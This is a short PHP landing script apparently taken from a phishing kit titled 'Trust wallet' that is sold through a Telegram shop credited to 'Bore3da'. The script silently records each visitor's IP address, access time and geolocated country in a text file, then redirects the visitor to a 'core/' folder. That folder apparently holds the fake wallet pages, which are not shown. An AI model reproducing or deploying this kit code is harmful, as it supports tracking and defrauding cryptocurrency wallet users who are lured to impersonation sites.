<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   Trust wallet
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
 */

require_once 'tower/main.php';
error_reporting(0);

date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$file = fopen("BORE3DA.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;

header("Location: core/"); 

?>
